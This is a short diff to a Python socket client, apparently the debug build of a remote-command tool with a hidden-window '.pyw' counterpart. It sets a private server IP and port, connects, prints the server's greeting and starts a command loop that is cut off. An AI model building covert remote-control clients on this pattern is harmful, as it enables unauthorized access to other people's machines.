@@ -7,14 +7,13 @@ import sys
 
 # THIS IS A DEBUG VERSION USE CLIENT.PYW INSTEAD 
 
-HOST = sys.argv[1] if len(sys.argv) > 1 else 'IP ADDRESS OF THE SERVER' # Change this to your public ip if you want to use it outside of your local network
+HOST = sys.argv[1] if len(sys.argv) > 1 else '192.168.2.203' # Change this to your public ip if you want to use it outside of your local network
 PORT = int(sys.argv[2] if len(sys.argv) > 2 else 5555) # Change the port if you want to but make sure to change it in Client.py as well
 print('Please wait while we establish a connection...')
 s = socket.socket()
 s.connect((HOST, PORT))
 msg = s.recv(1024).decode()
 print('[*] Server:', msg)
-print('Connection established')
 # Example for custom command, put your code in varName (you can change the name if you want)
 # varName = print('test')
 while True:
